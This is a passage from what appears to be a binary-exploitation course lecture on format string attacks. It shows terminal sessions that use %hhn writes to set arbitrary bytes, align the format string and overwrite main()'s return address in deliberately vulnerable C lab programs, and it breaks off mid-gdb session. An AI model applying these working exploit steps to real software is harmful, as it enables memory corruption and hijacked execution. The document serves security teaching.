[*] test_val @ 0x804a02c = 608256321 0x24414141

user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")AAAAAAAAAAAAAAAAAAAAAAA.%#08x.%#08x.%#08x.%hhn
Right: /AAAAAAAAAAAAAAAAAAAAAAA.%#08x.%#08x.%#08x.%hhn

Wrong: /AAAAAAAAAAAAAAAAAAAAAAA.0xbffff290.0x000400.0x000004.

[*] test_val @ 0x804a02c = 960577857 0x39414141
```

You can already start to see a problem: Adding individual values to get
the value we need can be really annoying. There's a better way, and
again, it relies on the format directive flags. We can arbitrarily
increase the length of an output by padding 0's. See below:

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#08x.%hhn
Right: /.%#08x.%#08x.%#08x.%hhn

Wrong: /.0xbffff2b0.0x000400.0x000004.

[*] test_val @ 0x804a02c = 574701889 0x22414141
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#016x.%hhn
Right: /.%#08x.%#08x.%#016x.%hhn

Wrong: /.0xbffff2b0.0x000400.0x00000000000004.

[*] test_val @ 0x804a02c = 708919617 0x2a414141
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#022x.%hhn
Right: /.%#08x.%#08x.%#022x.%hhn

Wrong: /.0xbffff2b0.0x000400.0x00000000000000000004.

[*] test_val @ 0x804a02c = 809582913 0x30414141
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0100x.%hhn
Right: /.%#08x.%#08x.%#0100x.%hhn

Wrong: /.0xbffff2b0.0x000400.0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.

[*] test_val @ 0x804a02c = 2118205761 0x7e414141
```

Great! But, there is still one problem here. You may have noticed that,
the first value we wrote to that byte was 0x22. What if we want to write
a value less than 0x22? It would seem that we can only add to the format
length, not decrease.

Turns out, we are still in the clear because of overflows. See what
happens when I set the format length such that we format more than 256
bytes.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0228x.%hhn
Right: /.%#08x.%#08x.%#0228x.%hhn

Wrong: /.0xbffff2b0.0x000400.0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.

[*] test_val @ 0x804a02c = -29277887 0xfe414141
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0229x.%hhn
Right: /.%#08x.%#08x.%#0229x.%hhn

Wrong: /.0xbffff2b0.0x000400.0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.

[*] test_val @ 0x804a02c = -12500671 0xff414141
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0230x.%hhn
Right: /.%#08x.%#08x.%#0230x.%hhn

Wrong: /.0xbffff2b0.0x000400.0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.

[*] test_val @ 0x804a02c = 4276545 0x00414141
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0231x.%hhn
Right: /.%#08x.%#08x.%#0231x.%hhn

Wrong: /.0xbffff2b0.0x000400.0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.

[*] test_val @ 0x804a02c = 21053761 0x01414141
```

As we tick over for 0xff, we wrap back around to 0x00 then 0x01 and so
on. Now we can full control what we write, and to where.

Writting multiple bytes
-----------------------

The final test is getting to write multiple bytes. Our goal is to write
0xdeabeef over the target. We are actually almost there. The first thing
we need to do is to write 0xbe to the byte we were messing with before.

Doing some math, we see that we were writing 0x22. To get to 0xbe that
is an additional 156 bytes in the format or so.

``` {.example}
ser@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0156x.%hhn
Right: /.%#08x.%#08x.%#0156x.%hhn

Wrong: /.0xbffff2b0.0x000400.0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.

[*] test_val @ 0x804a02c = -1237237439 0xb6414141
```

That was close. We are off by 8.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0164x.%hhn
Right: /.%#08x.%#08x.%#0164x.%hhn

Wrong: /.0xbffff2b0.0x000400.0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.

[*] test_val @ 0x804a02c = -1103019711 0xbe414141
```

Ok, now we can write the next byte. We do this by adding another `%hhn`
to the format string and again, this format directive needs to have an
address filled.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")%#08x.%#08x.%#0164x.%hhn.%hhn
Right: /.%#08x.%#08x.%#0164x.%hhn.%hhn

Wrong: /.0xbffff2a0.0x000400.0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004..

[*] test_val @ 0x804a02c = -1044233919 0xc1c24141
```

Crap! We changed our format length. Now we got to do the whole
calculation again ... but as usual, there is a better way.

Instead of doing these calculations one at a time, lets take advantage
of the format directives we've learned and try and be smart about
things. Firsts, let's get verything setup so that we have all our `%hhn`
formats to write to each of the bytes in the target variable.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$08x.%4\$08x.%1\$08x.%\5\$08x.%1\$08x.%\6\$08x.%1\$08x.%\7\$08x
Right: /.-,.%1$08x.%4$08x.%1$08x.%5$08x.%1$08x.%6$08x.%1$08x.%7$08x

Wrong: /.-,.bffff280.0804a02f.bffff280.0804a02e.bffff280.0804a02d.bffff280.0804a02c

[*] test_val @ 0x804a02c = 4276545 0x00414141
```

If you look closely at the format, you see we are doing argument
indexing to shorten the format length. We now have a bunch of `%x`
referencing the address we want to write too plus each has a leading
`%x` format so we can adjust the leading zeros to change how much we can
change the byte we are writing to that address.

Now it is just a matter of changing the `%x` that match the addresses we
want to write to `%hhn` and then manipulating the number of 0's in the
output.

``` {.example}
ser@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$08x.%4\$hhn.%1\$08x.%\5\$hhn.%1\$08x.%\6\$hhn.%1\$08x.%\7\$hhn
Right: /.-,.%1$08x.%4$hhn.%1$08x.%5$hhn.%1$08x.%6$hhn.%1$08x.%7$hhn

Wrong: /.-,.bffff280..bffff280..bffff280..bffff280.

[*] test_val @ 0x804a02c = 438578744 0x1a242e38
```

First, we need to change 0x1a into 0xde, that requires 196 additional
bytes. The first `%1$08x` changes into `%1$0204x` (that is, we were
printing up to 8 leading 0's, now we need 196 more to reach 204 leading
zeros).

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$0204x.%4\$hhn.%1\$08x.%\5\$hhn.%1\$08x.%\6\$hhn.%1\$08x.%\7\$hhn
Right: /.-,.%1$0204x.%4$hhn.%1$08x.%5$hhn.%1$08x.%6$hhn.%1$08x.%7$hhn

Wrong: /.-,.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..bffff280..bffff280..bffff280.

[*] test_val @ 0x804a02c = -555158788 0xdee8f2fc
```

Next up, we need to change 0xe8 into 0xad. That will require overflowing
and coming back around, which means wee need 0xff-0xea+1 to re-zero than
additional 0xad bytes to write, or 195 additional bytes. Again,
considering that we started by formatting 0x8, that means we change the
second `%x` to have 205 leading zeros.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$0204x.%4\$hhn.%1\$0205x.%\5\$hhn.%1\$08x.%\6\$hhn.%1\$08x.%\7\$hhn
Right: /.-,.%1$0204x.%4$hhn.%1$0205x.%5$hhn.%1$08x.%6$hhn.%1$08x.%7$hhn

Wrong: /.-,.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..bffff280..bffff280.

[*] test_val @ 0x804a02c = -559040575 0xdeadb7c1
```

Two more to go. We have `0xb7` needs to become `0xbe`. that's easy,
that's an additional 7 bytes, so we need to change the next %x to use 15
leading zeros.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$0204x.%4\$hhn.%1\$0205x.%\5\$hhn.%1\$015x.%\6\$hhn.%1\$08x.%\7\$hhn
Right: /.-,.%1$0204x.%4$hhn.%1$0205x.%5$hhn.%1$015x.%6$hhn.%1$08x.%7$hhn

Wrong: /.-,.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..0000000bffff280..bffff280.

[*] test_val @ 0x804a02c = -559038776 0xdeadbec8
```

Finally, we have 0xc8 that needs to become 0xef, which requires 39
additional leading zeros. So the last %x needs to be changed to 47.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$0204x.%4\$hhn.%1\$0205x.%\5\$hhn.%1\$015x.%\6\$hhn.%1\$047x.%\7\$hhn
Right: /.-,.%1$0204x.%4$hhn.%1$0205x.%5$hhn.%1$015x.%6$hhn.%1$047x.%7$hhn

Wrong: /.-,.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..0000000bffff280..000000000000000000000000000000000000000bffff280.

[*] test_val @ 0x804a02c = -559038737 0xdeadbeef
```

And there it is: DEADBEEF!

Overwriting the Return Address using a Format
=============================================

So far, we've used format string attacks to overwrite a arbitrary value,
but we need to now consider using this with an exploit.

Let's return to the example code we used the last time, but this time
there is a function `foo()` that we wish to call by overwriting the
return address of `main()`.

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "print_stack.h"


void foo(){
  printf("Go Navy!\n");
}


int main(int argc, char * argv[]){

  static int test_val = 0x00616161; //"AAA\0" as an int

  printf("Right: ");
  printf("%s", argv[1]);
  printf("\n\n");

  printf("Wrong: ");
  printf(argv[1]);      //<------!!!!!
  printf("\n\n");

  printf("[*] test_val @ %p = %#08x\n", &test_val,test_val);


  print_stack("main",2);

  return;

}
```

Note, I also added the `print_stack()` function so we can see what's
going in a bit more detail. We will eventually remove it in the complete
attack.

Alignment
---------

Before doing all that dirty work, let's setup our format string to be
properly aligned so we won't have to do a bunch of recalculations. The
goal is to produce a format string of the right length, with all the
parts present, such that we can just focus on writing bytes.

``` {.example}
                                need four totoal formats two-pair 
      addr2   addr4            formats to write a four-byte address
       /\      /\   .-------------------------------'---------------------.
      |  |    |  | /                                                       \
  AAAABBBBCCCCDDDD%1$008x.%1$00x.%1$008x.%1$00x.%1$008x.%1$00x.%1$008x.%1$00x
  |  |    |  |    \            /           \
   \/      \/      '-----.----'             '--- the index will change based
  addr1   addr3         |                        on alignment and 00x will be hhn
                        |
                     one format to adjust number of output bytes in foramte
                     and one format to be replaced by hhn to do the writing
```

Let's give this format a warm up shot in our program:

``` {.example}
user@si485H-base:demo$ ./fmt_vuln AAAABBBBCCCCDDDD%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1$00x.%1\$008x.%1\$00x
Right: AAAABBBBCCCCDDDD%1$008x.%1$00x.%1$008x.%1$00x.%1$008x.%1-bash0x.%1$008x.%1$00x

Wrong: AAAABBBBCCCCDDDDbffff85b.bffff85b.bffff85b.bffff85b.bffff85b.%1-bash0x.bffff85b.bffff85b

[*] test_val @ 0x804a028 = 0x616161
--- STACK main ---
0xbffff6a4 <ebp+0xc>: bffff734
0xbffff6a0 <ebp+0x8>: 00000002
0xbffff69c <ebp+0x4>: b7e33a83
0xbffff698 <ebp>: 00000000
0xbffff694 <ebp-0x4>: 00000000
0xbffff690 <ebp-0x8>: 08048610
0xbffff68c <ebp-0xc>: b7fc4000
0xbffff688 <ebp-0x10>: 00616161
0xbffff684 <ebp-0x14>: 00000002
0xbffff680 <ebp-0x18>: 08048725
0xbffff67c <ebp-0x1c>: 08048603
0xbffff678 <ebp-0x20>: bffff698
```

Ok, that looks good. Now we need to find at what index we find the start
of the format string itself so we can remove the AAAA and BBBB and CCCC
and DDDD and replace them with addresses we want to write too. For that,
we can use a bash script:

``` {.example}
user@si485H-base:demo$ for i in `seq 1 1 200`;  do echo -n "$i "; ./fmt_vuln AAAABBBBCCCCDDDD%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x | grep Wrong ; done | grep 41
41 Wrong: AAAABBBBCCCCDDDDbffff85a.b7fed180.bffff85a.b7fed180.bffff85a.b7fed180.bffff85a.b7fed180
70 Wrong: AAAABBBBCCCCDDDDbffff85a.b7fdd414.bffff85a.b7fdd414.bffff85a.b7fdd414.bffff85a.b7fdd414
121 Wrong: AAAABBBBCCCCDDDDbffff856.4141006e.bffff856.4141006e.bffff856.4141006e.bffff856.4141006e
122 Wrong: AAAABBBBCCCCDDDDbffff856.42424141.bffff856.42424141.bffff856.42424141.bffff856.42424141
141 Wrong: AAAABBBBCCCCDDDDbffff856.30302431.bffff856.30302431.bffff856.30302431.bffff856.30302431
```

Essentially, we iterate through the indexes until we find some sequence
of 0x41's (or other values we are interested in. If you look above, at
121 and 122 we see the sequences that matter, but they aren't quite
align the way we want. We need to add two bytes to the string to get the
alignment to work.

``` {.example}
user@si485H-base:demo$ for i in `seq 1 1 200`;  do echo -n "$i "; ./fmt_vuln AAAABBBBCCCCDDDD..%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x | grep Wrong ; done | grep 41
41 Wrong: AAAABBBBCCCCDDDD..bffff858.b7fed180.bffff858.b7fed180.bffff858.b7fed180.bffff858.b7fed180
70 Wrong: AAAABBBBCCCCDDDD..bffff858.b7fdd414.bffff858.b7fdd414.bffff858.b7fdd414.bffff858.b7fdd414
121 Wrong: AAAABBBBCCCCDDDD..bffff854.41414141.bffff854.41414141.bffff854.41414141.bffff854.41414141
141 Wrong: AAAABBBBCCCCDDDD..bffff854.30302431.bffff854.30302431.bffff854.30302431.bffff854.30302431
```

Notice the extra ".." following the D's to get everything to align
properly, if we use 121.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln AAAABBBBCCCCDDDD..%1\$008x.%121\$00x.%1\$008x.%122\$00x.%1\$008x.%123\$00x.%1\$008x.%124\$00x
Right: AAAABBBBCCCCDDDD..%1$008x.%121$00x.%1$008x.%122$00x.%1$008x.%123$00x.%1$008x.%124$00x

Wrong: AAAABBBBCCCCDDDD..bffff854.41414141.bffff854.42424242.bffff854.43434343.bffff854.44444444

[*] test_val @ 0x804a028 = 0x616161
--- STACK main ---
0xbffff694 <ebp+0xc>: bffff724
0xbffff690 <ebp+0x8>: 00000002
0xbffff68c <ebp+0x4>: b7e33a83
0xbffff688 <ebp>: 00000000
0xbffff684 <ebp-0x4>: 00000000
0xbffff680 <ebp-0x8>: 08048610
0xbffff67c <ebp-0xc>: b7fc4000
0xbffff678 <ebp-0x10>: 00616161
0xbffff674 <ebp-0x14>: 00000002
0xbffff670 <ebp-0x18>: 08048725
0xbffff66c <ebp-0x1c>: 08048603
0xbffff668 <ebp-0x20>: bffff688
```

Now we have what we need to completely aligned format string to use in
our exploit by writing bytes to the right place.

Writing Bytes
-------------

With a properly aligned format, let's start by writing the bytes we want
to a locale that we can see clearly the bytes we are writing. The sample
code makes this easy, we'll write to the test value at 0x804a02r. It's
just a matter of putting that address into our format string and
inserting some hhn's for writing.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$008x.%121\$hhn.%1\$008x.%122\$hhn.%1\$008x.%123\$hhn.%1\$008x.%124\$hhn
Right: '&%$..%1$008x.%121$hhn.%1$008x.%122$hhn.%1$008x.%123$hhn.%1$008x.%124$hhn

Wrong: '&%$..bffff854..bffff854..bffff854..bffff854.

[*] test_val @ 0x804a024 = 0x1b252f39
--- STACK main ---
0xbffff694 <ebp+0xc>: bffff724
0xbffff690 <ebp+0x8>: 00000002
0xbffff68c <ebp+0x4>: b7e33a83
0xbffff688 <ebp>: 00000000
0xbffff684 <ebp-0x4>: 00000000
0xbffff680 <ebp-0x8>: 080485e0
0xbffff67c <ebp-0xc>: b7fc4000
0xbffff678 <ebp-0x10>: 1b252f39
0xbffff674 <ebp-0x14>: 00000002
0xbffff670 <ebp-0x18>: 080486f5
0xbffff66c <ebp-0x1c>: 080485d3
0xbffff668 <ebp-0x20>: bffff688
```

Notice, that by planning, we are perfectly aligned because 00x is 3
characters long and so is hhn.

Also notice, that we are writing the bytes from **most significant** to
\* least significant\*. This is important because as we build up our
format, if we have to change the value we bytes earlier, that changes
the value of bytes later because it increases the length of the format.
However, consider that when writing addresses, it is the least
significant portion of the address space that will change more than the
most significant portion. By writing the values from most to least, this
means that the portion of the address which will change the least will
not be affected by the portion that will change the most. For example,
if we are writing to address 0xbffff982, but that changes to 0xbffff945,
we don't want to have to change the format writing of 0xbffff9 because
the 45 changed to 82. (BELIEVE ME ON THIS, I had to rework this lesson
multiple times to fix these problems. Write your bytes most-to-least
significant!)

Now, that we've gotten all that out of the way, let's get down to the
business of writing bytes. First, let's find the address of `foo()`:

``` {.example}
user@si485H-base:demo$ objdump -d fmt_vuln | grep foo
0804852d <foo>:
```

Now we get to work. In the most significant byte, currently we are
writing 0x1b but we need 0x08. This means we have to wrap around. Doing
some math:

``` {.example}
user@si485H-base:demo$ python -c "print (0x100 - 0x1b) + 0x8 + 8"
245
```

We need to write 256 bytes to get to 0x08 when accounting for the 8
bytes we are already writing.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$245x.%121\$hhn.%1\$008x.%122\$hhn.%1\$008x.%123\$hhn.%1\$008x.%124\$hhn
Right: '&%$..%1$245x.%121$hhn.%1$008x.%122$hhn.%1$008x.%123$hhn.%1$008x.%124$hhn

Wrong: '&%$..                                                                                                                                                                                                                                             bffff854..bffff854..bffff854..bffff854.

[*] test_val @ 0x804a024 = 0x8121c26
--- STACK main ---
0xbffff694 <ebp+0xc>: bffff724
0xbffff690 <ebp+0x8>: 00000002
0xbffff68c <ebp+0x4>: b7e33a83
0xbffff688 <ebp>: 00000000
0xbffff684 <ebp-0x4>: 00000000
0xbffff680 <ebp-0x8>: 080485e0
0xbffff67c <ebp-0xc>: b7fc4000
0xbffff678 <ebp-0x10>: 08121c26
0xbffff674 <ebp-0x14>: 00000002
0xbffff670 <ebp-0x18>: 080486f5
0xbffff66c <ebp-0x1c>: 080485d3
0xbffff668 <ebp-0x20>: bffff688
```

Now we need to write 04 byte we are writing 12, so we use the same
calculation again:

``` {.example}
user@si485H-base:demo$ python -c "print (0x100 - 0x12) + 0x4 + 8"
250
```

Updating our format to do 250 bytes of output:

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$245x.%121\$hhn.%1\$250x.%122\$hhn.%1\$008x.%123\$hhn.%1\$008x.%124\$hhn
Right: '&%$..%1$245x.%121$hhn.%1$250x.%122$hhn.%1$008x.%123$hhn.%1$008x.%124$hhn

Wrong: '&%$..                                                                                                                                                                                                                                             bffff854..                                                                                                                                                                                                                                                  bffff854..bffff854..bffff854.

[*] test_val @ 0x804a024 = 0x8040e18
--- STACK main ---
0xbffff694 <ebp+0xc>: bffff724
0xbffff690 <ebp+0x8>: 00000002
0xbffff68c <ebp+0x4>: b7e33a83
0xbffff688 <ebp>: 00000000
0xbffff684 <ebp-0x4>: 00000000
0xbffff680 <ebp-0x8>: 080485e0
0xbffff67c <ebp-0xc>: b7fc4000
0xbffff678 <ebp-0x10>: 08040e18
0xbffff674 <ebp-0x14>: 00000002
0xbffff670 <ebp-0x18>: 080486f5
0xbffff66c <ebp-0x1c>: 080485d3
0xbffff668 <ebp-0x20>: bffff688
```

Next we are writing 0x0e and we need to be writing 0x85, so again, math:

``` {.example}
user@si485H-base:demo$ python -c "print 0x85 - 0x0e + 8"
127
```

And an update of the format string:

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$245x.%121\$hhn.%1\$250x.%122\$hhn.%1\$127x.%123\$hhn.%1\$008x.%124\$hhn
Right: '&%$..%1$245x.%121$hhn.%1$250x.%122$hhn.%1$127x.%123$hhn.%1$008x.%124$hhn

Wrong: '&%$..                                                                                                                                                                                                                                             bffff854..                                                                                                                                                                                                                                                  bffff854..                                                                                                                       bffff854..bffff854.

[*] test_val @ 0x804a024 = 0x804858f
--- STACK main ---
0xbffff694 <ebp+0xc>: bffff724
0xbffff690 <ebp+0x8>: 00000002
0xbffff68c <ebp+0x4>: b7e33a83
0xbffff688 <ebp>: 00000000
0xbffff684 <ebp-0x4>: 00000000
0xbffff680 <ebp-0x8>: 080485e0
0xbffff67c <ebp-0xc>: b7fc4000
0xbffff678 <ebp-0x10>: 0804858f
0xbffff674 <ebp-0x14>: 00000002
0xbffff670 <ebp-0x18>: 080486f5
0xbffff66c <ebp-0x1c>: 080485d3
0xbffff668 <ebp-0x20>: bffff688
```

Now the last byte. We are writing 8f and the target is 2d, which means
wrapping around:

``` {.example}
user@si485H-base:demo$ python -c "print (0x100 - 0x8f) + 0x2d + 8"
166
```

And now we've got it:

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$245x.%121\$hhn.%1\$250x.%122\$hhn.%1\$127x.%123\$hhn.%1\$166x.%124\$hhn
Right: '&%$..%1$245x.%121$hhn.%1$250x.%122$hhn.%1$127x.%123$hhn.%1$166x.%124$hhn

Wrong: '&%$..                                                                                                                                                                                                                                             bffff854..                                                                                                                                                                                                                                                  bffff854..                                                                                                                       bffff854..                                                                                                                                                              bffff854.

[*] test_val @ 0x804a024 = 0x804852d
--- STACK main ---
0xbffff694 <ebp+0xc>: bffff724
0xbffff690 <ebp+0x8>: 00000002
0xbffff68c <ebp+0x4>: b7e33a83
0xbffff688 <ebp>: 00000000
0xbffff684 <ebp-0x4>: 00000000
0xbffff680 <ebp-0x8>: 080485e0
0xbffff67c <ebp-0xc>: b7fc4000
0xbffff678 <ebp-0x10>: 0804852d
0xbffff674 <ebp-0x14>: 00000002
0xbffff670 <ebp-0x18>: 080486f5
0xbffff66c <ebp-0x1c>: 080485d3
0xbffff668 <ebp-0x20>: bffff688
```

Overwriting the return address
------------------------------

Now, that we have everything in place, it's only a matter of overwriting
the return address. Fortunately, I've been printing out the stack each
time to make life easier, so we know the address of the return address
is 0xbffff68c. We can now stick that in to the from of our format string
to complete the exploit.

``` {.example}
user@si485H-base:demo$ ./fmt_vuln $(printf '\x8f\xf6\xff\xbf')$(printf '\x8e\xf6\xff\xbf')$(printf '\x8d\xf6\xff\xbf')$(printf '\x8c\xf6\xff\xbf')..%1\$245x.%121\$hhn.%1\$250x.%122\$hhn.%1\$127x.%123\$hhn.%1\$166x.%124\$hhn
Right: ????????????????..%1$245x.%121$hhn.%1$250x.%122$hhn.%1$127x.%123$hhn.%1$166x.%124$hhn

Wrong: ????????????????..                                                                                                                                                                                                                                             bffff854..                                                                                                                                                                                                                                                  bffff854..                                                                                                                       bffff854..                                                                                                                                                              bffff854.

[*] test_val @ 0x804a024 = 0x616161
--- STACK main ---
0xbffff694 <ebp+0xc>: bffff724
0xbffff690 <ebp+0x8>: 00000002
0xbffff68c <ebp+0x4>: 0804852d
0xbffff688 <ebp>: 00000000
0xbffff684 <ebp-0x4>: 00000000
0xbffff680 <ebp-0x8>: 080485e0
0xbffff67c <ebp-0xc>: b7fc4000
0xbffff678 <ebp-0x10>: 00616161
0xbffff674 <ebp-0x14>: 00000002
0xbffff670 <ebp-0x18>: 080486f5
0xbffff66c <ebp-0x1c>: 080485d3
0xbffff668 <ebp-0x20>: bffff688
Go Navy!
```

Formatting With Less Help
=========================

Ok, now that we've seen this in action, we need to pull away some of the
aids that's have been making this easier. In particular, let's no longer
print the stack each time and let's get rid of the test~val~. Instead,
we'll have a much, much plainer vulnerable program.

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void foo(){
  printf("Go Navy!\n");
}


int main(int argc, char * argv[]){

  int a = 0xdeadbeef;
  //LOTS OF CODE MIGHT BE HERE
  printf(argv[1]);

  return;
}
```

Alignment
---------

Aligning our format is mostly the same process; however, finding the
target address to overwrite will be different. We should consider a
format that will both allow us to do arbitrary writes *AND* check what
we are writing.

This format output is essentially the same as what we've done before,
but I've added one extra format to the end.

``` {.example}
user@si485H-base:demo$ ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$#08x
AAAABBBBCCCCDDDDbffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.0xbffff724
```

That extra format, we'll align up to 0xdeadbeef:

``` {.example}
user@si485H-base:demo$ ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1\$00x.%7\$#08x
AAAABBBBCCCCDDDDbffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.0xdeadbeef
```

This will be our target we'll write to. Now to align the rest of the
format.

``` {.example}
user@si485H-base:demo$ for i in `seq 1 1 200`; do echo -n "$i "; ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%7\$#08x ; done | grep 41
41 AAAABBBBCCCCDDDDbffff724.2.bffff724.2.bffff724.2.bffff724.2.0xdeadbeef
74 AAAABBBBCCCCDDDDbffff724.b7fdd414.bffff724.b7fdd414.bffff724.b7fdd414.bffff724.b7fdd414.0xdeadbeef
123 AAAABBBBCCCCDDDDbffff724.41414141.bffff724.41414141.bffff724.41414141.bffff724.41414141.0xdeadbeef
141 AAAABBBBCCCCDDDDbffff724.252e7838.bffff724.252e7838.bffff724.252e7838.bffff724.252e7838.0xdeadbeef
```

And we see that at 123, we find the alignment we are looking for.

``` {.example}
user@si485H-base:demo$ ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%123\$00x.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
AAAABBBBCCCCDDDDbffff724.41414141.bffff724.42424242.bffff724.43434343.bffff724.44444444.0xdeadbeef
```

Determining where to write
--------------------------

Now, things get a bit sticky. We have the aligned format but we are not
entirely sure what address to replace the A's, B's, C's, and D's with.
Let's fire up gdb and see if we can learn something more about the
address alignment.

``` {.example}
(gdb) br main
Breakpoint 1 at 0x804849a: file plain_fmt.c, line 12.
(gdb) r AAAABBBBCCCCDDDD%1\$008x.%123\$00x.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x 
Starting program: /home/user/git/si485-binary-exploits/lec/21/demo/plain_fmt AAAABBBBCCCCDDDD%1\$008x.%123\$00x.%1\$008x.%124\$00x.%1\$008x.%125\$00x.%1\$008x.%126\$00x.%7\$#08x

Breakpoint 1, main (argc=2, argv=0xbffff6d4) at plain_fmt.c:12
12    int a = 0xdeadbeef;
```

Now we're under gdb, let's print the entire stack frame:

``` {.example}
(gdb) x/12x $esp
